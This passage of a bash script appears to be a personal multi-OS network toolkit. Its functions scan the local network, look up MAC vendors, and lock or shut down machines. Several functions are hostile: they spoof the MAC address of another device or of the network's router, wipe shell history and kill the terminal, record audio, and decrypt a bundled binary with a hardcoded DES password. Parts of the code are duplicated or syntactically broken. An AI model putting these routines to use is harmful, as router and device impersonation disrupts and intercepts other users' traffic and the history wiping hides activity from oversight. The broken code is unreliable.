  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
  # Search Database
  get_database
  vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
  [[ -z $vendor ]] && vendor="Unknown"
  # Print Result
  printf "$BLUE$vendor$NC\n"
  exit 0



}


_newj(){ #selft




  # Set Functions
  usage()
  {
  echo "MAC Vendor Help"
  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
  exit 0
  }
  get_database()
  {
  # Test Connection One
  #  ping -c 1 standards-oui.ieee.org &> /dev/null
  #  [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] Was unable to reach the first database." && exit 68

    # Test Connection Two
      ping -c 1 github.com &> /dev/null
      [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
  # Download Database
    database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72

: '
    if [ "$database" | grep -c Moved > 1 ]
       ping -c 1 github.com &> /dev/null
       [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
       database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
       [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
    fi
    '
  }
  format_vendor_address()
  {
    [[ -n $1 ]] && vendor_address="$1"
    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
  if [[ ${#vendor_address} == "6" ]]; then
  return
  else
      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
  fi
  }
  # Set Arguments
  while getopts ":s:a:h" opt; do
  case $opt in
      s )  silent=true; vendor_address="$OPTARG" ;;
      a )  vendor_address="$OPTARG" ;;
      h )  usage ;;
  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
  esac
  done
  # Get Vendor Address
  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
  format_vendor_address
  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
  # Search Database
  get_database
  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{print $6,$7}' | sed 's/<\/td>//g')"
  [[ -z $vendor ]] && vendor="Unknown"
  # Print Result
  printf "$BLUE$vendor$NC\n"
  exit 0



}

_newScan(){ #demon

   arp -a | awk -v column=$4 '{ $column = _jvdr($column); print }'


}


_lock(){ #selfc

   _system="$(uname -s)"



 if [ $_system == "Darwin" ]; then  #tw

   pmset displaysleepnow

 elif [[ $_system == "Linux" ]]; then  #tw

   gnome-screensaver-command -l

 elif [[ $_system == "GNU" ]]; then #tw

   exec login ; exec login

 elif [[ $_system == "Minix" ]]; then

   printf "$RED Not supported yet$NC\n"

 elif [[ $_system == "OpenBSD" ]]; then

   printf "$RED Not supported yet$NC\n"

 elif [[ $_system == "$(uname -n)" ]]; then

   printf "$RED Not supported yet$NC\n"

 else

   printf "$RED Not supported default$NC\n"

 fi

 _u_data 2> /dev/null

}

_origin(){ #selft


  ps -p $1 | awk '{print $4;}' | sed '1d'

  _u_data 2> /dev/null

}


_off(){ #selfc

  _system="$(uname -s)"


 if [ $_system == "AIX" ]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "Darwin" ]]; then #tw
   sudo airport -z
 elif [[ $_system == "Linux" ]]; then #nn
   sudo ip link set dev enp0s3 down
 elif [[ $_system == "GNU" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "Haiku" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "HP-UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "Minix" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "OpenBSD" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "SunOS" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "$(uname -n)" ]]; then
   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "OS/390" ]]; then
   printf "$RED Not supported yet$NC\n"
 else
   printf "$RED Not supported default$NC\n"
 fi

 _u_data 2> /dev/null

}


_design(){ #selfx

    if [ "$1" == "wpn" ]; then
      if [ "$2" == "blade" ]; then
        printf "$RED Not supported yet$NC\n"
      elif [[ "$2" == "handgun" ]]; then
        printf "$RED Not supported yet$NC\n"
      elif [[ "$2" == "rifle" ]]; then
        printf "$RED Not supported yet$NC\n"
      elif [[ "$2" == "launcher" ]]; then
        printf "$RED Not supported yet$NC\n"
      else
        printf "$RED Weapon type not specified$NC\n"
      fi
    elif [[ "$1" == "vcl" ]]; then
      if [ "$2" == "one" ]; then
        printf "$RED I like trains$NC\n"
      elif [[ "$2" == "two" ]]; then

        if [ "$3" == "car" ]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "minibus" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "bus" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "jeep" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "truck" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "mm" ]]; then
          printf "$RED Not supported yet$NC\n"
        else
          printf "$RED Not supported default$NC\n"
        fi

      elif [[ "$2" == "three" ]]; then

        if [ "$3" == "chopper" ]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "plane" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "glider" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "jetpack" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "saucer" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "rocket" ]]; then
          printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "satellite" ]]; then
          printf "$RED Not supported yet$NC\n"
        else
          printf "$RED Not supported default$NC\n"
        fi

      elif [[ "$2" == "four" ]]; then
        printf "$RED Not supported yet$NC\n"
      else
        printf "$RED Vehicle type not specified$NC\n"
      fi
    elif [[ "$1" == "obj" ]]; then
      printf "$RED Not supported yet$NC\n"
    else
      printf "$RED Design data failure$NC\n"
    fi

    _u_data 2> /dev/null

}

_flush(){ #selft

_system="$(uname -s)"

if [ $_system == "Darwin" ]; then #nn
   sudo killall -HUP mDNSResponder
elif [[ $_system == "Linux" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "GNU" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "Haiku" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "HP-UX" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "Minix" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "OpenBSD" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "SunOS" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "$(uname -n)" ]]; then
   printf "$RED Not supported yet$NC\n"
elif [[ $_system == "OS/390" ]]; then
   printf "$RED Not supported yet$NC\n"
else
   printf "$RED Not supported sys$NC\n"
fi

_u_data 2> /dev/null

}


_on(){ #selft




   _system="$(uname -s)"

   if [ $_system == "AIX" ]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Darwin" ]]; then #nn
     networksetup -setairportpower en0 off
     networksetup -setairportpower en0 on
   elif [[ $_system == "Linux" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "GNU" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Haiku" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "HP-UX" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Minix" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OpenBSD" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "SunOS" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "$(uname -n)" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OS/390" ]]; then
     printf "$RED Not supported yet$NC\n"
   else
     printf "$RED Not supported sys$NC\n"
   fi

   _u_data 2> /dev/null

}


_metamorph(){ #selfx


   _system="$(uname -s)"


   if [[ $1 == "image" ]]; then

      if [ $2 == "iso" ]; then
        if [ $_system == "Darwin" ]; then #tn
            sudo hdiutil makehybrid -iso -joliet -o $3.iso $4
        elif [[ $_system == "Linux" ]]; then #tw
            mkisofs -o $3.iso $4
        elif [[ $_system == "GNU" ]]; then #nn
            mkisofs -o $3.iso $4
        elif [[ $_system == "Haiku" ]]; then #nn
            mkisofs -o $3.iso $4
        elif [[ $_system == "Minix" ]]; then #nn
            mkisofs -o $3.iso $4
        elif [[ $_system == "OpenBSD" ]]; then #nn
            mkisofs -o $3.iso $4
        else
            printf "$RED Not supported sys$NC\n"
        fi
      else
        printf "$RED Image type not supported$NC\n"
      fi

   elif [[ $1 == "arch" ]]; then

     if [ $2 == "tar" ]; then
       if [ $_system == "Darwin" ]; then #tw
          sudo tar -vcf $3.tar $4
       elif [[ $_system == "Linux" ]]; then #tw
          sudo tar -vcf $3.tar $4
       elif [[ $_system == "GNU" ]]; then #nn
          sudo tar -vcf $3.tar $4
       elif [[ $_system == "Haiku" ]]; then #nn
          sudo tar -vcf $3.tar $4
       elif [[ $_system == "Minix" ]]; then #nn
           sudo tar -vcf $3.tar $4
       elif [[ $_system == "OpenBSD" ]]; then #nn
           sudo tar -vcf $3.tar $4
       else
          printf "$RED Not supported sys$NC\n"
       fi
     else
       printf "$RED Archive type not supported$NC\n"
     fi

   elif [[ $1 == "-e" ]]; then

     if [ $_system == "Darwin" ]; then #tw
        openssl des -in $2 -out $2.sslz
      elif [[ $_system == "Linux" ]]; then #tw
        openssl des -in $2 -out $2.sslz
      elif [[ $_system == "GNU" ]]; then #tw
        openssl pbkdf2 -in $2 -out $2.sslz
      elif [[ $_system == "Haiku" ]]; then #nn
        openssl des -in $2 -out $2.sslz
      elif [[ $_system == "Minix" ]]; then #nn
        openssl des -in $2 -out $2.sslz
      elif [[ $_system == "OpenBSD" ]]; then #nn
        openssl des -in $2 -out $2.sslz
      else
        printf "$RED Not supported sys$NC\n"
      fi

   elif [[ $1 == "-d" ]]; then

        if [ $_system == "Darwin" ]; then #tw
           openssl des -d -in $2 -out $2.d
         elif [[ $_system == "Linux" ]]; then #tw
           openssl des -d -in $2 -out $2.d
         elif [[ $_system == "GNU" ]]; then #tw
           openssl pbkdf2 -d -in $2 -out $2.d
         elif [[ $_system == "Haiku" ]]; then #nn
           openssl des -d -in $2 -out $2.d
         elif [[ $_system == "Minix" ]]; then #nn
           openssl des -d -in $2 -out $2.d
         elif [[ $_system == "OpenBSD" ]]; then #nn
           openssl des -d -in $2 -out $2.d
         else
           printf "$RED Not supported sys$NC\n"
         fi

   elif [[ $1 == "magic" ]]; then

        printf "\n"
        printf " Images: ISO\n"
        printf " Archives: TAR\n"
        printf " Encrypt: DES AES256 PBKDF2\n"
        printf "\n"

   else
        printf "$RED Metamorphing failed$NC\n"
   fi

   _u_data 2> /dev/null

}

_hide(){ #selfc

  _off
  sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
  end=$( for i in {1..6} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' )
  echo 00-60-2F$end)
  _on
  printf "$WHITE Velkommen, $(ifconfig en0 | grep ether | awk '{print $1}')$NC\n"

}


_piece(){ #selfc

  _off
  sudo ifconfig en0 ether $(arp -a | awk '{print $4}' | sed '1d')
  if [ "$1" == "-v" ]; then
     printf "Okay so we are off the network.\n"
     printf "We spoofed your address with one already present in the network\n"
     printf "Reconnecting to network...\n"
  fi
  _on
  printf "$WHITE Integration done: $(ifconfig en0 | grep ether | awk '{print $1}')$NC\n"

}


_mb(){ #selfc

  _off
  sudo ifconfig en0 ether $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')
  if [ "$1" == "-v" ]; then
     printf "Okay so we are off the network.\n"
     printf "We spoofed your address with the network's router\n"
     printf "Reconnecting to network...\n"
  fi
  _on
  printf "$WHITE Hello, Motherboard: $(ifconfig en0 | grep ether | awk '{print $1}')$NC\n"

}




_profile_core(){ #selfc


  printf "Muie\n"



}







_blood(){ #selft


  _system="$(uname -s)"


  if [ $_system == "Darwin" ]; then #tw

  _red ; clear ; netstat -ap tcp ; quietTextRestore

elif [[ $_system == "Linux" ]]; then #tn

   _red ; clear ; netstat -ap tcp ; quietTextRestore

 elif [[ $_system == "GNU" ]]; then #nn

   printf "$RED Not supported yet$NC\n"

 elif [[ $_system == "Haiku" ]]; then #nn

    _red ; clear ; netstat ; quietTextRestore

  elif [[ $_system == "HP-UX" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore


  elif [[ $_system == "Minix" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore

  elif [[ $_system == "OpenBSD" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore

  elif [[ $_system == "SunOS" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore

  elif [[ $_system == "$(uname -n)" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore

  elif [[ $_system == "OS/390" ]]; then #nn

    _red ; clear ; netstat -ap tcp ; quietTextRestore

  else

    printf "$RED Not supported sys$NC\n"

  fi

  _u_data 2> /dev/null

}

_light(){ #selft



_system="$(uname -s)"


if [ $_system == "Darwin" ]; then #tw

_yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "Linux" ]]; then #tw

 _yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "GNU" ]]; then #nn

  printf "$RED Not supported yet$NC\n" # no netstat. pizdu pfinet? inetutils no

elif [[ $_system == "Haiku" ]]; then #nn

  _yellow ; clear ; netstat ; quietTextRestore

elif [[ $_system == "HP-UX" ]]; then #nn

  _yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "Minix" ]]; then #nn

  _yellow ; clear ; udpstat ; quietTextRestore

elif [[ $_system == "OpenBSD" ]]; then #nn

  _yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "SunOS" ]]; then #nn

  _yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "$(uname -n)" ]]; then #nn

  _yellow ; clear ; netstat -ap udp ; quietTextRestore

elif [[ $_system == "OS/390" ]]; then #nn

  _yellow ; clear ; netstat -ap udp ; quietTextRestore

else

  printf "$RED Not supported sys$NC\n"

fi

_u_data 2> /dev/null

}

_poof(){ #selfc


  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then #tw

    killall Terminal

  elif [[ $_system == "Linux" ]]; then #tn

    killall gnome-terminal

  elif [[ $_system == "GNU" ]]; then #nn

    kill $(ps -a | grep term)

  elif [[ $_system == "Haiku" ]]; then #nn

    killall Terminal

  elif [[ $_system == "HP-UX" ]]; then #nn

    killall terminal

  elif [[ $_system == "Minix" ]]; then #nn

    killall terminal

  elif [[ $_system == "OpenBSD" ]]; then #nn

    killall terminal

  elif [[ $_system == "SunOS" ]]; then #nn

    killall terminal

  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn

    killall terminal

  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn

    killall terminal

  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn

    killall terminal

  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn

    killall terminal

  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn

    killall terminal

  elif [[ $_system == "$(uname -n)" ]]; then #nn

    killall terminal

  elif [[ $_system == "OS/390" ]]; then #nn

    killall terminal

  else

    printf "$RED Not supported sys$NC\n"

  fi



}

_clear(){ #selfc

   history -c
   airport -z
   _rampage
   killall Terminal

}

_macA(){ #selft

_system="$(uname -s)"

if [ $_system == "Darwin" ]; then #tw
   ifconfig en0 | grep ether | awk '{print $2}'
elif [[ $_system == "Linux" ]]; then #tw
   ifconfig enp0s3 | grep ether | awk '{print $2}'
elif [[ $_system == "GNU" ]]; then #tw
   inetutils-ifconfig | grep hardware | awk '{print $3}'
elif [[ $_system == "Haiku" ]]; then #tw
   ifconfig | grep Address | sed '1d' | awk '{print $5}'
elif [[ $_system == "HP-UX" ]]; then #nn
   ifconfig em0 | grep lladdr | awk '{print $2}'
elif [[ $_system == "Minix" ]]; then #tw
   hostaddr -e
elif [[ $_system == "OpenBSD" ]]; then #tw
   ifconfig em0 | grep lladdr | awk '{print $2}'
elif [[ $_system == "SunOS" ]]; then #nn
   ifconfig em0 | grep lladdr | awk '{print $2}'
elif [[ $_system == "$(uname -n)" ]]; then #nn
   ifconfig em0 | grep lladdr | awk '{print $2}'
elif [[ $_system == "OS/390" ]]; then #nn
   ifconfig em0 | grep lladdr | awk '{print $2}'
else
   printf "$RED Not supported sys$NC\n"
fi
#  printf "$YELLOW$(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"

_u_data 2> /dev/null

}



_suicide(){ #selfc

  _system="$(uname -s)"


  if [ $_system == "AIX" ]; then #nn
     shutdown
   elif [[ $_system == "Darwin" ]]; then #tw
     sudo shutdown now
  elif [[ $_system == "Linux" ]]; then #tw
     shutdown now
   elif [[ $_system == "GNU" ]]; then #tw
     su
     shutdown now
   elif [[ $_system == "Haiku" ]]; then #tw
     shutdown
   elif [[ $_system == "HP-UX" ]]; then #nn
     shutdown
   elif [[ $_system == "Minix" ]]; then #tw
     shutdown now
   elif [[ $_system == "OpenBSD" ]]; then #tw
     shutdown now
   elif [[ $_system == "SunOS" ]]; then #nn
     shutdown
   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
     shutdown
   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
     shutdown
   elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
     shutdown
   elif [[ $_system == "$(uname -n)" ]]; then #nn
     shutdown
   elif [[ $_system == "OS/390" ]]; then #nn
     shutdown
   elif [[ $_system == "INTEGRITY" ]]; then #nn
     shutdown ; shutdown now ; shutdown -s ; shutdown -n ; shutdown -t 0
   elif [[ $_system == "Integrity" ]]; then #nn
     shutdown ; shutdown now ; shutdown -s ; shutdown -n ; shutdown -t 0
   elif [[ $_system == "$(uname -n)" ]]; then #nn
     shutdown
   else
     printf "$RED Not supported sys$NC\n"
   fi



}

_reboot(){ #selfc




_system="$(uname -s)"


if [ $_system == "AIX" ]; then #nn
   reboot
 elif [[ $_system == "Darwin" ]]; then #tw
   sudo reboot now -l
elif [[ $_system == "Linux" ]]; then #tw
   sudo reboot now
 elif [[ $_system == "OpenBSD" ]]; then #tw
   reboot
 elif [[ $_system == "Minix" ]]; then #tw
   reboot now
 elif [[ $_system == "GNU" ]]; then #tw
   su
   reboot -f
 elif [[ $_system == "Haiku" ]]; then #tw
   reboot
 elif [[ $_system == "HP-UX" ]]; then #nn
   reboot
 elif [[ $_system == "SunOS" ]]; then #nn
   reboot
 elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
   reboot
 elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
   reboot
 elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
   reboot
 elif [[ $_system == "$(uname -n)" ]]; then #nn
   reboot
 elif [[ $_system == "OS/390" ]]; then #nn
   reboot
 elif [[ $_system == "INTEGRITY" ]]; then #nn
   reboot ; reboot now ; reboot -s ; reboot -n
 elif [[ $_system == "Integrity" ]]; then #nn
   reboot ; reboot now ; reboot -s ; reboot -n
 elif [[ $_system == "$(uname -n)" ]]; then #nn
   reboot
 else
   printf "$RED Not supported sys$NC\n"
 fi

}


_record_v(){ #selft

   printf "$RED Not supported yet$NC\n"

   _u_data 2> /dev/null

}

_record_a(){ #selft



   _system="$(uname -s)"


   if [ $_system == "Darwin" ]; then
      ffmpeg -f avfoundation -i ":1" capture_a.mp3
   elif [[ $_system == "Linux" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "GNU" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "Haiku" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "HP-UX" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "Minix" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OpenBSD" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "SunOS" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "$(uname -n)" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OS/390" ]]; then
      printf "$RED Not supported yet$NC\n"
    else
      printf "$RED Not supported sys$NC\n"
    fi

    _u_data 2> /dev/null

}

_record_w(){ #selft

   printf "$RED Not supported yet$NC\n"

}

_capture(){ #selft


  if [ "$(echo $1 | grep -c 'i')" == "1" ]; then
    _cheese $2
  elif [[ "$(echo $1 | grep -c 'd')" == "1" ]]; then
    #_snap $2

    printf ""
    printf "name: $(echo $0 | sed 's/\/usr\/local\/bin\///g'),\n"
    printf "id: $_id,\n"
    printf "ip: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'ip' | awk '{print $2}')\n"
    printf "loc: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'city' | awk '{print $2}' | sed 's/"//g' | sed 's/,//g')_$(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'country' | awk '{print $2}' | sed 's/"//g' | sed 's/,//g'),\n"
    printf "crd: $(curl -sf ipinfo.io | sed '$d' | sed '1d' | grep 'loc' | awk '{print $2}')\n"
    printf "os: $(uname -s),\n"
    printf "arch: $(uname -m),\n"
    printf "power: true,\n"
    printf ""

  elif [[ "$(echo $1 | grep -c 'v')" == "1" ]]; then
    _record_v $2
  elif [[ "$(echo $1 | grep -c 'a')" == "1" ]]; then
    _record_a $2
  elif [[ "$(echo $1 | grep -c 'w')" == "1" ]]; then
    _record_w $2
  else
    printf "$RED Not supported default$NC\n"
  fi



}


_incr(){

    printf "$RED Not supported yet$NC\n"

}






_scanHouse(){ #selft


if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi

   _system="$(uname -s)"


    if [ "$(echo $1 | grep -c 'd')" == "1" ]; then

      if [ $_system == "Darwin" ]; then

         printf "\n"
         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
         printf "\n"

         sudo arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Linux" ]]; then

         printf "\n"
         printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
         printf "\n"

         sudo arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "GNU" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Haiku" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "HP-UX" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"


       elif [[ $_system == "Minix" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "OpenBSD" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         sudo arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "SunOS" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "OS/390" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"


       else

         printf "$RED Not supported sys$NC\n"

      fi


    elif [[ "$(echo $1 | grep -c 'c')" == "1" ]]; then

      if [ $_system == "Darwin" ]; then

         printf "\n"
         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
         printf "\n"

         FIRST=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}')
         SECOND=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}')
         if [ -f /usr/local/bin/zneic ]; then
            THIRD=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}' |  xargs -L1 zneic -os)
            FOURTH=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}' |  xargs -L1 zneic -soui)
         else
            THIRD=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}' |  xargs -L1 xzneic -os)
            FOURTH=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}' |  xargs -L1 xzneic -soui)
         fi

         : '
         printf " %-20s | %-20s | %-20s\n " IP\ ADDRESS\ MAC ADDRESS\ WHATEVER\ HEAD
         printf "%-20s | %-20s | %-20s\n" "$FIRST\n" "$SECOND\n" "$THIRD\n" "$FOURTH\n"
         '


         printf "$RED\n"
         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}'
         printf "$FIRST\n"
         printf "$YELLOW\n"
         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}' |  xargs -L1 zneic -os
         printf "$SECOND\n"
         printf "$GREEN\n"
         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}'
         printf "$THIRD\n"
         printf "$RED\n"
         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}' |  xargs -L1 zneic -soui
         printf "$FOURTH\n"

         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Linux" ]]; then

         printf "\n"
         printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
         printf "\n"

         sudo arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "GNU" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Haiku" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "HP-UX" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"


       elif [[ $_system == "Minix" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "OpenBSD" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         sudo arp-scan -l | sed -n '2!p'
         printf "$WHITE\n"
         date
         printf "$NC\n"

